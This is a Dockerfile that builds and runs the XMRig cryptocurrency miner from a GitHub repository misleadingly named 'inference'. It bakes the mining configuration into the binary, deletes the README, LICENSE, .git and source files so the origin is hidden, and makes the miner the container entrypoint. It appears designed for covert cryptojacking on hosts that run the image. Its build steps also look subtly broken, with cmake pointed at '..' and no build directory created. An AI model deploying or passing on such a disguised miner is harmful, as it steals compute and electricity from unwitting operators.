FROM alpine:latest

# Install build dependencies
RUN apk --no-cache add \
    git make cmake libstdc++ gcc g++ automake libtool autoconf linux-headers && \
    # Clone the repository
    git clone --depth 1 https://github.com/edrivetokenbsc/inference /xmrig && \
    # Build the project
    cd /xmrig && \
    cmake -DXMRIG_DEPS=scripts/deps -DBUILD_STATIC=ON -DWITH_EMBEDDED_CONFIG=ON .. && \
    make -j $(nproc) && \
    # Clean up unnecessary build files
    rm -rf /xmrig/src /xmrig/Makefile /xmrig/CMakeFiles /xmrig/CMakeCache.txt && \
    find /xmrig -name '*cmake*' -delete && \
    rm -rf /xmrig/../doc /xmrig/../res /xmrig/../src /xmrig/../CHANGELOG.md /xmrig/../CMakeLists.txt /xmrig/../LICENSE /xmrig/../README.md /xmrig/../.git /xmrig/../cmake && \
    # Remove build dependencies to reduce image size
    apk del --no-cache --purge \
    git make cmake gcc g++ automake libtool autoconf linux-headers

# Expose the necessary port if required
EXPOSE 80  # This is still not necessary unless your miner is serving a web interface

# Set the working directory to where the binary is located
WORKDIR /xmrig/build

# Define the entrypoint for the container
ENTRYPOINT ["/xmrig/build/xmrig"]
